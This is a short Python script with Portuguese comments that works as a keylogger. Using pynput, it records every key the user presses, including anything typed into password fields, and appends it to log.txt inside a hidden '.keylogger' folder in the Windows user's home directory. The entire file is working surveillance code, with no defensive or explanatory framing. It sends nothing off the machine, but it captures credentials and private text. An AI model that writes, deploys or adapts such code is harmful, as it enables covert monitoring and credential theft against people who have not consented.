from pynput.keyboard import Listener
import os
import getpass
# pega o usuario do win
usuario = getpass.getuser()

#definir a localização do arquivo de log
logFile = f"C://Users/{usuario}/.keylogger/log.txt"

#caminho pra criar a pasta keylogger no diretorio do usuario ativo
pasta = f'C://Users/{usuario}/.keylogger'       
# verifica se ja tem a pasta keylogger
try:
    os.mkdir(pasta)
except:
    pass

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #dicionário com as teclas a serem traduzidas
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.backspace": "-",
        "Key.right": "",
        "Key.left": "",
        "Key.tab": "    "
    }

    #converter a tecla pressionada para string
    keydata = str(key)

    #remover as asplas simples que delimitam os caracteres
    keydata = keydata.replace("'", "")

    for key in translate_keys:
        #key recebe a chave do dicionário translate_keys
        #substituir a chave (key) pelo seu valor (translate_keys[key])
        keydata = keydata.replace(key, translate_keys[key])

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    l.join()
